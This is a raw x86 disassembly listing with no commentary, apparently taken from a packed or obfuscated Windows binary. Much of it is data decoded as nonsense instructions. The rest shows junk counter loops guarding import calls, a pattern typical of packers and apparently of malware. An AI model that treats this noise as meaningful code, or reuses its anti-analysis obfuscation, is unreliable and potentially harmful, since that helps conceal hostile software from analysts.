  4030b0:	lds    edi,FWORD PTR [eax]
  4030b2:	jmp    0xe68f8213
  4030b7:	add    al,0x89
  4030b9:	fisub  DWORD PTR [ebx]
  4030bb:	and    esi,DWORD PTR [edi]
  4030bd:	repnz test eax,0x551217d
  4030c3:	leave  
  4030c4:	adc    eax,0x71a44e40
  4030c9:	add    al,0x2c
  4030cb:	xor    edx,ecx
  4030cd:	in     al,dx
  4030ce:	test   al,0x4a
  4030d0:	dec    esi
  4030d1:	pop    esi
  4030d2:	sbb    eax,0xc2e76797
  4030d7:	mov    dl,0x10
  4030d9:	inc    ebx
  4030da:	inc    ebx
  4030db:	mov    ebp,0x74b09ed9
  4030e0:	push   ebp
  4030e1:	pop    ds
  4030e2:	idiv   DWORD PTR [edi-0x7d]
  4030e5:	push   0xd4fea1b1
  4030ea:	inc    eax
  4030eb:	jns    0x4030e6
  4030ed:	mov    esp,0x3e82b56a
  4030f3:	clc    
  4030f4:	hlt    
  4030f5:	iret   
  4030f6:	push   ecx
  4030f7:	push   esi
  4030f8:	scas   al,BYTE PTR es:[edi]
  4030f9:	ja     0x4030a2
  4030fb:	sar    BYTE PTR [ecx],1
  4030fd:	push   ebp
  4030fe:	xor    cl,bl
  403100:	into   
  403101:	xchg   edi,eax
  403102:	dec    esp
  403103:	in     eax,dx
  403104:	int3   
  403105:	sbb    al,0x14
  403107:	fwait
  403108:	in     eax,0xda
  40310a:	xchg   edx,eax
  40310b:	pop    es
  40310c:	mov    eax,ds:0x7f160690
  403111:	arpl   sp,dx
  403113:	es aad 0xd7
  403116:	rol    BYTE PTR [ebp+0x4b932c3e],cl
  40311c:	sbb    esi,DWORD PTR [edi+ebx*1]
  40311f:	or     BYTE PTR es:[eax],bl
  403122:	fistp  WORD PTR [esi]
  403124:	pop    edx
  403125:	adc    eax,0x49914876
  40312a:	sar    BYTE PTR [edi],cl
  40312c:	ds cwde 
  40312e:	push   esi
  40312f:	cdq    
  403130:	sub    eax,0xb1979b31
  403135:	xor    ch,cl
  403137:	ins    DWORD PTR es:[edi],dx
  403138:	fcompp 
  40313a:	int3   
  40313b:	or     bh,bh
  40313d:	push   eax
  40313e:	dec    BYTE PTR [ebx+0xd8bc845]
  403144:	mov    al,0x3b
  403146:	inc    ecx
  403147:	add    BYTE PTR [ecx],al
  403149:	or     BYTE PTR [edi-0x17],bl
  40314c:	pushf  
  40314d:	add    DWORD PTR [eax],eax
  40314f:	add    BYTE PTR [edx],al
  403151:	adc    DWORD PTR [eax+0x21b389ab],ecx
  403157:	mov    cl,0x82
  403159:	xchg   edx,eax
  40315a:	pop    esp
  40315b:	shl    DWORD PTR [eax-0x45537305],0x17
  403162:	jle    0x4031e2
  403164:	cli    
  403165:	jg     0x4031e5
  403167:	jle    0x403151
  403169:	dec    ebx
  40316a:	inc    ecx
  40316b:	push   esi
  40316c:	sub    al,BYTE PTR [edi+0x4fca70c0]
  403172:	jl     0x403130
  403174:	aas    
  403175:	int    0xec
  403177:	sbb    al,0x33
  403179:	cs in  eax,0xff
  40317c:	push   cs
  40317d:	retf   0xf1a5
  403180:	iret   
  403181:	fidivr WORD PTR [edx+0x2c4d26bb]
  403187:	retf   0xf161
  40318a:	lock out dx,eax
  40318c:	cmp    BYTE PTR [esi*4+0xb8cd7ce],ch
  403193:	ret    0x503b
  403196:	mov    eax,?
  403198:	ret    
  403199:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40319b:	adc    al,0xe8
  40319d:	xchg   ecx,eax
  40319e:	ds pop ebp
  4031a0:	jmp    0x8dd2:0x89a0b29
  4031a7:	xor    eax,0x3abd5c45
  4031ac:	jp     0x403196
  4031ae:	arpl   cx,bp
  4031b0:	lods   al,BYTE PTR ds:[esi]
  4031b1:	je     0x4031d8
  4031b3:	ins    BYTE PTR es:[edi],dx
  4031b4:	mov    ah,0x9
  4031b6:	(bad)  
  4031b7:	icebp  
  4031b8:	add    dl,bl
  4031ba:	mov    cl,0xb4
  4031bc:	xchg   ecx,esp
  4031be:	inc    edx
  4031bf:	mov    ebp,0x2326f5b3
  4031c4:	scas   al,BYTE PTR es:[edi]
  4031c5:	or     eax,0xf48f1f79
  4031ca:	push   esp
  4031cb:	or     dh,ah
  4031cd:	les    edx,FWORD PTR [edi]
  4031cf:	pop    esp
  4031d0:	sbb    bh,ch
  4031d2:	cld    
  4031d3:	das    
  4031d4:	cmp    edi,DWORD PTR [ebx+eiz*4]
  4031d7:	inc    esp
  4031d8:	xor    ch,BYTE PTR [esi]
  4031da:	mov    esp,0xdbfa672a
  4031df:	sbb    dh,al
  4031e1:	push   ebp
  4031e2:	push   ecx
  4031e3:	sbb    ecx,DWORD PTR [eax-0x35]
  4031e6:	jl     0x4031e0
  4031e8:	mov    edx,0x32f7bac7
  4031ed:	inc    ebp
  4031ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031ef:	ins    BYTE PTR es:[edi],dx
  4031f0:	mov    dl,0xe6
  4031f2:	jecxz  0x403222
  4031f4:	xchg   ebp,eax
  4031f5:	mov    WORD PTR ds:0x1f6a9d41,gs
  4031fb:	add    ebp,DWORD PTR [edi]
  4031fd:	ds sti 
  4031ff:	daa    
  403200:	or     DWORD PTR [edx-0x5f0ad5f8],edi
  403206:	add    al,0xe3
  403208:	sbb    DWORD PTR [edi-0x49],esp
  40320b:	and    bh,al
  40320d:	hlt    
  40320e:	into   
  40320f:	pushw  es
  403211:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403212:	dec    edx
  403213:	popa   
  403214:	sbb    ecx,DWORD PTR [edx-0x579bb60]
  40321a:	cdq    
  40321b:	frstor [ebx]
  40321d:	mov    bl,0xa7
  40321f:	outs   dx,DWORD PTR ds:[esi]
  403220:	and    DWORD PTR [edi-0x6f],esi
  403223:	xor    al,0x8a
  403225:	mov    edx,0x510a9cb2
  40322a:	adc    eax,0xfc77fdbd
  40322f:	xor    DWORD PTR [edi-0x20e39b],0xf
  403236:	int    0xcd
  403238:	xchg   edx,eax
  403239:	inc    esi
  40323a:	add    edi,DWORD PTR [edx+0x2019bbfa]
  403240:	test   al,0xc8
  403242:	mov    ds:0xf5831372,eax
  403247:	mov    bl,0x7b
  403249:	inc    eax
  40324a:	mov    dh,0xf
  40324c:	cmp    ebx,DWORD PTR [ecx]
  40324e:	and    DWORD PTR [ebx+0x1e],ebx
  403251:	lods   al,BYTE PTR ds:[esi]
  403252:	xor    al,0xcc
  403254:	jp     0x403200
  403256:	shl    edi,1
  403258:	pop    esp
  403259:	ficomp WORD PTR [ebx+0x259d8f29]
  40325f:	mov    esi,esp
  403261:	retf   
  403262:	lea    edx,[esi+0x41]
  403265:	or     ebp,DWORD PTR [edx+0x6f]
  403268:	mov    ebp,0x107e4942
  40326d:	cmp    ecx,0xffffffb0
  403270:	std    
  403271:	pop    edi
  403272:	test   DWORD PTR [ecx],ebp
  403274:	push   0x6c
  403276:	pop    eax
  403277:	les    edx,FWORD PTR [esp+ebp*2]
  40327a:	xor    eax,0x4c611039
  40327f:	cmc    
  403280:	sbb    edi,esi
  403282:	sbb    BYTE PTR [eax+ebp*8+0x395289f8],0xd1
  40328a:	neg    BYTE PTR [esi]
  40328c:	and    al,BYTE PTR [ebx-0xcff6310]
  403292:	pop    eax
  403293:	fnsave [edx+0x5c]
  403296:	or     DWORD PTR [esi-0x514aa66e],esi
  40329c:	(bad)  
  40329d:	xchg   edx,eax
  40329e:	xor    BYTE PTR ds:0x8dafdee1,dh
  4032a4:	sub    bl,BYTE PTR [ebp+0x485d434d]
  4032aa:	popw   ds
  4032ac:	add    BYTE PTR [edx+0x5b0d12ee],0x77
  4032b3:	outs   dx,DWORD PTR ds:[esi]
  4032b4:	push   es
  4032b5:	jnp    0x403312
  4032b7:	mov    bh,0xd0
  4032ba:	dec    ebp
  4032bb:	xchg   DWORD PTR [ebx],esi
  4032bd:	popf   
  4032be:	inc    ebp
  4032bf:	call   0x964bdf10
  4032c4:	repnz dec ebx
  4032c6:	idiv   DWORD PTR [edx+ecx*8+0x12]
  4032ca:	xchg   ecx,eax
  4032cb:	sub    ecx,DWORD PTR [esi]
  4032cd:	sub    bh,BYTE PTR [ebp-0x4e]
  4032d0:	xchg   esi,eax
  4032d1:	push   es
  4032d2:	and    al,0xf
  4032d4:	push   ebp
  4032d5:	xor    al,BYTE PTR [ecx+ebx*2-0x40d9814d]
  4032dc:	pop    ecx
  4032dd:	out    0xc4,al
  4032df:	mov    ebx,0xa07674de
  4032e4:	int3   
  4032e5:	push   esi
  4032e6:	xchg   ecx,eax
  4032e7:	mov    esp,0x8e51a1c0
  4032ec:	pop    esi
  4032ed:	pop    ebx
  4032ee:	leave  
  4032ef:	ret    
  4032f0:	push   ebp
  4032f1:	mov    ebp,esp
  4032f3:	sub    esp,0x2c
  4032f6:	leave  
  4032f7:	ret    0x10
  4032fa:	push   ebp
  4032fb:	mov    ebp,esp
  4032fd:	sub    esp,0x44
  403300:	push   edi
  403301:	mov    eax,DWORD PTR [ebp+0xc]
  403304:	and    DWORD PTR ds:0x43375b,0x0
  40330e:	xor    ecx,ecx
  403310:	add    ecx,DWORD PTR ds:0x43375b
  403316:	inc    ecx
  403317:	mov    DWORD PTR ds:0x43375b,ecx
  40331d:	cmp    DWORD PTR ds:0x43375b,0x26
  403324:	jne    0x403335
  40332a:	push   0x476d
  40332f:	call   DWORD PTR ds:0x412278
  403335:	cmp    DWORD PTR ds:0x43375b,0x1d
  40333c:	jb     0x40330e
  403342:	not    edx
  403344:	mov    DWORD PTR [ebp-0x10],eax
  403347:	xor    DWORD PTR ds:0x4337ef,0x1717
  403351:	mov    eax,DWORD PTR [ebp+0x8]
  403354:	sbb    DWORD PTR ds:0x4337d7,0x2700
  40335e:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  403365:	mov    ecx,DWORD PTR ds:0x43371f
  40336b:	add    DWORD PTR ds:0x433703,ecx
  403371:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  403378:	xor    edi,0x7913
  40337e:	mov    edx,DWORD PTR [ebp+0x8]
  403381:	mov    DWORD PTR ds:0x433757,0x1e
  40338b:	cmp    DWORD PTR ds:0x433757,0x0
  403392:	je     0x4033dc
  403398:	cmp    DWORD PTR ds:0x433757,0xb
  40339f:	jne    0x4033ae
  4033a5:	push   DWORD PTR [ebp-0x18]
  4033a8:	call   DWORD PTR ds:0x41227c
  4033ae:	cmp    DWORD PTR ds:0x433757,0xc
  4033b5:	jne    0x4033c8
  4033bb:	mov    edi,DWORD PTR ds:0x433757
  4033c1:	dec    edi
  4033c2:	mov    DWORD PTR ds:0x433757,edi
  4033c8:	xor    edi,edi
  4033ca:	add    edi,DWORD PTR ds:0x433757
  4033d0:	dec    edi
  4033d1:	mov    DWORD PTR ds:0x433757,edi
  4033d7:	jmp    0x40338b
  4033dc:	mov    DWORD PTR [ebp-0x40],eax
  4033df:	dec    DWORD PTR ds:0x4337e7
  4033e5:	mov    eax,0x7510854
  4033ea:	xor    edx,eax
  4033ec:	mov    ecx,DWORD PTR ds:0x433747
  4033f2:	mov    edi,DWORD PTR ds:0x433787
  4033f8:	sub    ecx,edi
  4033fa:	imul   ecx,DWORD PTR [ecx+edi*1]
  4033fe:	mov    ecx,0x32729b
  403403:	add    edx,ecx
  403405:	mov    DWORD PTR ds:0x433767,0x1c
  40340f:	cmp    DWORD PTR ds:0x433767,0x0
  403416:	je     0x40345e
  40341c:	cmp    DWORD PTR ds:0x433767,0xa
  403423:	jne    0x403432
  403429:	push   DWORD PTR [ebp-0x24]
  40342c:	call   DWORD PTR ds:0x412288
  403432:	cmp    DWORD PTR ds:0x433767,0xb
  403439:	jne    0x40344c
  40343f:	mov    edi,DWORD PTR ds:0x433767
  403445:	dec    edi
  403446:	mov    DWORD PTR ds:0x433767,edi
  40344c:	mov    edi,DWORD PTR ds:0x433767
  403452:	dec    edi
  403453:	mov    DWORD PTR ds:0x433767,edi
  403459:	jmp    0x40340f
  40345e:	mov    DWORD PTR [ebp-0x8],edx
  403461:	mov    edx,DWORD PTR ds:0x4337e3
  403467:	and    edx,DWORD PTR ds:0x433817
  40346d:	mov    DWORD PTR ds:0x4337e3,edx
  403473:	mov    edx,DWORD PTR [ebp+0x8]
  403476:	sbb    DWORD PTR ds:0x43379b,0x6be7
  403480:	xor    edx,eax
  403482:	add    edx,ecx
  403484:	not    edi
  403486:	mov    DWORD PTR [ebp+0xc],edx
  403489:	not    edi
  40348b:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  403492:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403499:	mov    edx,DWORD PTR ds:0x43381f
  40349f:	adc    DWORD PTR ds:0x4336ff,edx
  4034a5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4034ac:	adc    edx,edx
  4034ae:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4034b5:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  4034bc:	mov    DWORD PTR ds:0x433817,0x10
  4034c6:	cmp    DWORD PTR ds:0x433817,0x0
  4034cd:	je     0x403517
  4034d3:	cmp    DWORD PTR ds:0x433817,0x9
  4034da:	jne    0x4034eb
  4034e0:	push   0x5d47
  4034e5:	call   DWORD PTR ds:0x41233c
  4034eb:	cmp    DWORD PTR ds:0x433817,0xa
  4034f2:	jne    0x403505
  4034f8:	mov    edi,DWORD PTR ds:0x433817
  4034fe:	dec    edi
  4034ff:	mov    DWORD PTR ds:0x433817,edi
  403505:	mov    edi,DWORD PTR ds:0x433817
  40350b:	dec    edi
  40350c:	mov    DWORD PTR ds:0x433817,edi
  403512:	jmp    0x4034c6
  403517:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40351e:	and    DWORD PTR ds:0x43382b,ecx
  403524:	jmp    0x403827
  403529:	sbb    ecx,ebp
  40352b:	add    ah,dl
  40352d:	lock shr ebx,1
  403530:	icebp  
  403531:	mov    ?,WORD PTR [ebp-0x64132b76]
  403537:	mov    BYTE PTR [edi+0x7e7e15c6],ah
  40353d:	pop    eax
  40353e:	jl     0x4035be
  403540:	jle    0x403548
  403542:	dec    ecx
  403543:	pop    ebx
  403544:	ins    DWORD PTR es:[edi],dx
  403545:	push   0xcdc353c6
  40354a:	pop    esi
  40354b:	pop    esp
  40354c:	rol    DWORD PTR [edi],1
  40354e:	shl    cl,1
  403550:	cmp    al,0x9a
  403552:	push   ebp
  403553:	(bad)
  403558:	xor    edi,DWORD PTR [ecx+0x67aa289e]
  40355e:	jge    0x403594
  403560:	xchg   ebx,eax
  403561:	dec    esi
  403562:	stos   BYTE PTR es:[edi],al
  403563:	jl     0x4034eb
  403565:	mov    ebx,0x995c8c17
  40356a:	or     cl,bh
  40356c:	mov    BYTE PTR [ecx],dl
  40356e:	out    0xd6,eax
  403570:	dec    eax
  403571:	call   0x3d64:0x3d660096
  403578:	iret   
  403579:	jmp    0xfda9a4b9
  40357e:	enter  0x69b1,0x9d
  403582:	cmp    eax,0xca2da2c
  403587:	ins    BYTE PTR es:[edi],dx
  403588:	cdq    
  403589:	inc    edi
  40358a:	pop    esi
  40358b:	push   0x34bdd708
  403590:	jne    0x4035a8
  403592:	addr16 (bad) 
  403594:	je     0x3b822628
  40359a:	nop
  40359b:	jae    0x40353c
  40359d:	ds inc ebp
  40359f:	mov    edx,0xce66adc
  4035a4:	or     al,0xec
  4035a6:	cwde   
  4035a7:	xlat   BYTE PTR ds:[ebx]
  4035a8:	sahf   
  4035a9:	add    ebp,ebp
  4035ab:	out    0x6b,eax
  4035ad:	inc    ecx
  4035ae:	push   ecx
  4035af:	push   ss
  4035b0:	mov    al,0xf4
  4035b2:	out    dx,eax
  4035b3:	jb     0x4035e6
  4035b5:	xor    DWORD PTR [ebp+0x5678dbc7],eax
  4035bb:	lock xchg esi,eax
  4035bd:	adc    ch,dh
  4035bf:	in     al,dx
  4035c0:	mov    esp,edx
  4035c2:	out    dx,eax
  4035c3:	adc    DWORD PTR [ebp-0x75],0x1
  4035c7:	jmp    0x403558
  4035c9:	arpl   si,sp
  4035cb:	cmp    al,0xfd
  4035cd:	hlt    
  4035ce:	mov    bl,0xe0
  4035d0:	ds inc edx
  4035d2:	jb     0x40362b
  4035d4:	or     ecx,DWORD PTR [edi]
  4035d6:	ins    BYTE PTR es:[edi],dx
  4035d7:	sbb    ah,0x5b
  4035da:	loop   0x403568
  4035dc:	push   eax
  4035dd:	cmp    edx,DWORD PTR [esp+esi*1+0x7e20b9fa]
  4035e4:	jne    0x403631
  4035e6:	mov    WORD PTR [edx+0xd9c1aa9],ds
  4035ec:	add    al,0xf
  4035ee:	or     bl,al
  4035f0:	int    0x15
  4035f2:	rcl    BYTE PTR [edi+0x705f5ebc],1
  4035f8:	mov    BYTE PTR [ebp-0x279085a2],al
  4035fe:	push   ss
  4035ff:	push   cs
  403600:	ds cld 
  403602:	mov    dl,0xdb
  403604:	sub    edx,ebp
  403606:	fs jmp 0x4035b6
  403609:	cmp    BYTE PTR [esi-0x2c51c9c3],bl
  40360f:	mov    al,0xd
  403611:	mov    edi,0x43bf7258
  403616:	mov    bh,0xab
  403618:	repz int 0x70
  40361b:	dec    eax
  40361c:	cmp    edi,DWORD PTR [esi]
  40361e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40361f:	jecxz  0x403629
  403621:	adc    edi,ebp
  403623:	out    dx,al
  403624:	fs xchg ecx,eax
  403626:	fwait
  403627:	ret    
  403628:	adc    ah,bl
  40362a:	aaa    
  40362b:	mov    esp,0x38539a33
  403630:	push   ebx
  403631:	adc    eax,0xa0cffa79
  403636:	mov    ds:0x93f67726,al
  40363b:	test   BYTE PTR [eax+0x28c3f611],0x54
  403642:	neg    DWORD PTR [esi+0x297a2f52]
  403648:	call   0x7ac2278e
  40364d:	and    dl,BYTE PTR [ecx-0x9]
  403650:	jg     0x4036c3
  403652:	retf   0x6a38
  403655:	dec    edx
  403656:	sub    DWORD PTR [ebx-0x42a83973],edi
  40365c:	sbb    dl,BYTE PTR [edi+0x5e]
  40365f:	push   esp
  403660:	jnp    0x4036c0
  403662:	inc    eax
  403663:	fst    DWORD PTR [ecx-0x3736efc6]
  403669:	cmp    BYTE PTR [ebp-0x19d5786a],0xa1
  403670:	sbb    ebx,DWORD PTR [esi+0x2d]
  403673:	sub    al,BYTE PTR [ebx+0x6]
  403676:	repz je 0x403623
  403679:	xchg   ecx,eax
  40367a:	scas   al,BYTE PTR es:[edi]
  40367b:	sbb    edi,0xabe2f0a
  403681:	mov    bh,0x6a
  403683:	sbb    dl,BYTE PTR [ebx-0x6b]
  403686:	js     0x4036e1
  403688:	push   esp
  403689:	fild   QWORD PTR [ecx-0x3b75b38]
  40368f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403690:	repz sbb al,0xba
  403693:	push   es
  403694:	xor    bl,ch
  403696:	adc    cl,ah
  403698:	fst    QWORD PTR [edx+0x36]
  40369b:	mov    ebp,0xfedd48e2
  4036a0:	rol    BYTE PTR [ecx+0x63b86f12],1
  4036a6:	inc    edi
  4036a7:	lock push ecx
  4036a9:	es inc ecx
  4036ab:	scas   eax,DWORD PTR es:[edi]
  4036ac:	stos   DWORD PTR es:[edi],eax
  4036ad:	sub    eax,0x9c59a8e6
  4036b2:	mov    al,0xfe
  4036b4:	xchg   esi,eax
  4036b5:	pop    edi
  4036b6:	cmp    ebp,edx
  4036b8:	pusha  
  4036b9:	lods   eax,DWORD PTR ds:[esi]
  4036ba:	add    eax,0xf51e53b8
  4036bf:	add    BYTE PTR [edi+0x2d],dh
  4036c2:	xor    dl,BYTE PTR [edx-0x4d]
  4036c5:	mov    al,bh
  4036c7:	(bad)
  4036cc:	mov    ch,0x49
  4036ce:	shl    edx,cl
  4036d0:	jno    0x4036bd
  4036d2:	mov    DWORD PTR [esi-0x6e0b3d4d],0x70d6ecb8
  4036dc:	add    al,0xa3
  4036de:	mov    dl,0x35
  4036e0:	cmp    ah,BYTE PTR [eax+0x6600c54f]
  4036e6:	aaa    
  4036e7:	xor    esi,DWORD PTR [esi-0x1cb50be9]
  4036ed:	cwde   
  4036ee:	ret    0xbb0e
  4036f1:	xor    ecx,DWORD PTR [edx]
  4036f3:	xor    dh,BYTE PTR [ecx]
  4036f5:	inc    edx
  4036f6:	inc    edi
  4036f7:	(bad)  [eax-0x2d]
  4036fa:	xchg   esp,eax
  4036fb:	jl     0x40368b
  4036fd:	xchg   esi,eax
  4036fe:	sti    
  4036ff:	ja     0x4036f0
  403701:	call   FWORD PTR [ecx+eax*2-0x73]
  403705:	jnp    0x4036af
  403707:	inc    edx
  403708:	lock add DWORD PTR [ebp-0x232b7c3b],ecx
  40370f:	adc    edx,DWORD PTR [ecx+ecx*4-0x1e]
  403713:	adc    eax,0x7d40ee68
  403718:	dec    edi
  403719:	add    esp,DWORD PTR [eax+0x614cd17e]
  40371f:	add    BYTE PTR [edi+0x10],0x7d
  403723:	push   eax
  403724:	inc    esi
  403725:	lahf   
  403726:	cmp    esi,DWORD PTR [ebp+0x17]
  403729:	inc    ebp
  40372a:	stos   BYTE PTR es:[edi],al
  40372b:	bnd jl 0x4036eb
  40372e:	lods   al,BYTE PTR ds:[esi]
  40372f:	push   eax
  403730:	push   ebx
  403731:	xor    eax,0x6e13f789
  403736:	jecxz  0x4036e7
  403738:	rcl    ch,1
  40373a:	sub    bh,BYTE PTR ss:[ecx+eax*1]
  40373e:	rol    DWORD PTR [esi-0x25],0xca
  403742:	xor    BYTE PTR [esi],bl
  403744:	pop    ecx
  403745:	cmp    DWORD PTR [ecx-0x10],edx
  403748:	dec    ebp
  403749:	outs   dx,BYTE PTR ds:[esi]
  40374a:	mov    bl,0x4b
  40374c:	icebp  
  40374d:	ds jge 0x40370d
  403750:	cdq    
  403751:	scas   al,BYTE PTR es:[edi]
  403752:	fstp   DWORD PTR [edx+0x60a53a5e]
  403758:	enter  0x1f13,0xbc
  40375c:	sbb    al,al
  40375e:	sbb    DWORD PTR [ecx],esi
  403760:	das    
  403761:	jp     0x4037b7
  403763:	mov    cl,0xb8
  403765:	adc    esi,DWORD PTR [edi-0x2d98b010]
  40376b:	adc    BYTE PTR [edx],bh
  40376d:	push   0x2d
  40376f:	das    
  403770:	or     DWORD PTR [ebx],esi
  403772:	cmp    eax,0x78a714f3
  403777:	add    al,BYTE PTR [esi-0x5139730b]
  40377d:	jbe    0x403785
  40377f:	xchg   ecx,eax
  403780:	lds    ebx,FWORD PTR [ebx+0x6]
  403783:	pop    esp
  403784:	(bad)  [edi+0x7a]
  403787:	mov    edx,0x85efb111
  40378c:	mov    ?,WORD PTR [ebx+eax*8]
  40378f:	repnz push cs
  403791:	add    eax,0x3c8ef1fe
  403796:	dec    edi
  403797:	mov    al,ds:0xcf3cff94
  40379c:	or     eax,0xa7494814
  4037a1:	and    ebp,edx
  4037a3:	aas    
  4037a4:	push   cs
  4037a5:	ins    BYTE PTR es:[edi],dx
  4037a6:	mov    esp,0x7b384105
  4037ab:	lds    edi,FWORD PTR [ebp+esi*2-0x375fe33d]
  4037b2:	das    
  4037b3:	dec    edi
  4037b4:	push   edx
  4037b5:	dec    ebp
  4037b6:	adc    BYTE PTR [edx],dl
  4037b8:	and    eax,DWORD PTR [ecx-0x76]
  4037bb:	imul   esi,DWORD PTR es:[edx+0x173a7ba1],0x24aefeb5
  4037c6:	rol    BYTE PTR [edi+0x4c11df6a],cl
  4037cc:	sub    DWORD PTR [esp+ebx*1+0x5f69aa66],esp
  4037d3:	mov    bl,0x44
  4037d5:	inc    edx
  4037d6:	sbb    eax,0x8d370409
  4037db:	jl     0x4037d0
  4037dd:	mov    BYTE PTR [ebp+0x7a04d5f],0x96
  4037e4:	adc    ecx,eax
  4037e6:	jecxz  0x40381e
  4037e8:	call   0x9c4f:0x13c6ac10
  4037ef:	repz inc esi
  4037f1:	gs out 0xc4,eax
  4037f4:	fistp  WORD PTR [ebx]
  4037f6:	sub    eax,0x138a6550
  4037fb:	mov    cl,0x6d
  4037fd:	mov    ebx,0xfe15cdb6
  403802:	fdivr  QWORD PTR [ebx-0x14]
  403805:	je     0x403795
  403807:	cld    
  403808:	and    DWORD PTR [ebx-0x2c7cf8c7],0xe94285d5
  403812:	jo     0x4037fa
  403814:	jnp    0x4037be
  403816:	pop    edx
  403817:	jmp    0x4037b3
  403819:	(bad)  
  40381a:	jns    0x4037a1
  40381c:	ins    DWORD PTR es:[edi],dx
  40381d:	mov    WORD PTR [ebx],?
  40381f:	and    eax,esp
  403821:	cmp    eax,0x27475a72
  403826:	and    al,bh
  403828:	inc    ebp
  403829:	les    edi,FWORD PTR [eax]
  40382b:	test   DWORD PTR [eax+edi*8+0x36fb3d1b],ebx
  403832:	inc    ebx
  403833:	add    BYTE PTR [ebx+0x3d1b0855],cl
  403839:	stos   DWORD PTR es:[edi],eax
  40383a:	aaa    
  40383b:	inc    ebx
  40383c:	add    BYTE PTR [ebx],dh
  40383e:	rol    BYTE PTR [ecx+0x43382725],1
  403844:	add    BYTE PTR [eax],al
  403846:	add    BYTE PTR [eax],al
  403848:	add    BYTE PTR [ebx],dh
  40384a:	inc    DWORD PTR [ebx]
  40384c:	cmp    eax,0x433827
  403851:	inc    edi
  403852:	mov    DWORD PTR ds:0x433827,edi
  403858:	cmp    DWORD PTR ds:0x433827,0xc
  40385f:	jne    0x403882
  403865:	push   0x86d9
  40386a:	push   0x47ad
  40386f:	push   0x8605
  403874:	push   DWORD PTR [ebp-0x24]
  403877:	push   0x3fd8
  40387c:	call   DWORD PTR ds:0x41228c
  403882:	cmp    DWORD PTR ds:0x433827,0xb
  403889:	jne    0x40389c
  40388f:	mov    edi,DWORD PTR ds:0x433827
  403895:	inc    edi
  403896:	mov    DWORD PTR ds:0x433827,edi
  40389c:	cmp    DWORD PTR ds:0x433827,0x17
  4038a3:	jb     0x403849
  4038a9:	or     edi,0x3f73
  4038af:	mov    edi,DWORD PTR [ebp-0x10]
  4038b2:	sub    DWORD PTR ds:0x43376b,0x43382b
  4038bc:	add    edx,ecx
  4038be:	mov    DWORD PTR ds:0x433793,0x73ae
  4038c8:	cmp    edi,edx
  4038ca:	mov    DWORD PTR ds:0x4337eb,0x7cd1
  4038d4:	je     0x4057b4
  4038da:	mov    DWORD PTR ds:0x433827,0x58cf
  4038e4:	push   ebx
  4038e5:	jmp    0x40578f
  4038ea:	xor    DWORD PTR ds:0x4337eb,0x4337ab
  4038f4:	mov    edx,DWORD PTR [ebp-0x8]
  4038f7:	sub    DWORD PTR ds:0x4336fb,ecx
  4038fd:	mov    edi,DWORD PTR [ebp-0x10]
  403900:	sub    edi,edx
  403902:	xor    DWORD PTR ds:0x433717,edi
  403908:	mov    edx,DWORD PTR [ebp-0x4]
  40390b:	xor    DWORD PTR ds:0x433713,0x16cd
  403915:	xor    edx,eax
  403917:	mov    DWORD PTR ds:0x43381b,0x2437
  403921:	add    edx,ecx
  403923:	cmp    edi,edx
  403925:	jb     0x4057b3
  40392b:	mov    DWORD PTR ds:0x4336ff,0x1d
  403935:	cmp    DWORD PTR ds:0x4336ff,0x0
  40393c:	je     0x40399d
  403942:	cmp    DWORD PTR ds:0x4336ff,0x6
  403949:	jne    0x40396b
  40394f:	push   DWORD PTR [ebp-0x28]
  403952:	push   DWORD PTR [ebp-0x14]
  403955:	push   0x0
  403957:	push   0x6853
  40395c:	push   DWORD PTR [ebp-0x20]
  40395f:	push   DWORD PTR [ebp-0x1c]
  403962:	push   DWORD PTR [ebp-0xc]
  403965:	call   DWORD PTR ds:0x4120b8
  40396b:	cmp    DWORD PTR ds:0x4336ff,0x7
  403972:	jne    0x403985
  403978:	mov    ebx,DWORD PTR ds:0x4336ff
  40397e:	dec    ebx
  40397f:	mov    DWORD PTR ds:0x4336ff,ebx
  403985:	mov    ebx,DWORD PTR ds:0x4336ff
  40398b:	dec    ebx
  40398c:	mov    DWORD PTR ds:0x4336ff,ebx
  403992:	jmp    0x403935
  403997:	xor    edx,DWORD PTR ds:0x433767
  40399d:	mov    edx,DWORD PTR [ebp-0x28]
  4039a0:	mov    edi,DWORD PTR ds:0x433713
  4039a6:	sub    edi,DWORD PTR ds:0x433823
  4039ac:	mov    DWORD PTR ds:0x433713,edi
  4039b2:	mov    edi,DWORD PTR [ebp-0x4]
  4039b5:	xor    edx,eax
  4039b7:	mov    DWORD PTR ds:0x433707,0x1b
  4039c1:	cmp    DWORD PTR ds:0x433707,0x0
  4039c8:	je     0x4039fe
  4039ce:	cmp    DWORD PTR ds:0x433707,0x26
  4039d5:	jne    0x4039e4
  4039db:	push   DWORD PTR [ebp-0x18]
  4039de:	call   DWORD PTR ds:0x4120bc
  4039e4:	xor    ebx,ebx
  4039e6:	xor    ebx,DWORD PTR ds:0x433707
  4039ec:	dec    ebx
  4039ed:	mov    DWORD PTR ds:0x433707,ebx
  4039f3:	jmp    0x4039c1
  4039f8:	neg    DWORD PTR ds:0x433717
  4039fe:	xor    edi,eax
  403a00:	and    DWORD PTR ds:0x4336fb,0x0
  403a0a:	xor    ebx,ebx
  403a0c:	or     ebx,DWORD PTR ds:0x4336fb
  403a12:	inc    ebx
  403a13:	mov    DWORD PTR ds:0x4336fb,ebx
  403a19:	cmp    DWORD PTR ds:0x4336fb,0x25
  403a20:	jne    0x403a31
  403a26:	push   0x66db
  403a2b:	call   DWORD PTR ds:0x4120c0
  403a31:	cmp    DWORD PTR ds:0x4336fb,0x1e
  403a38:	jb     0x403a0a
  403a3e:	add    edi,ecx
  403a40:	add    edx,ecx
  403a42:	mov    DWORD PTR ds:0x4337d7,0x19
  403a4c:	cmp    DWORD PTR ds:0x4337d7,0x0
  403a53:	je     0x403a80
  403a59:	cmp    DWORD PTR ds:0x4337d7,0x26
  403a60:	jne    0x403a6e
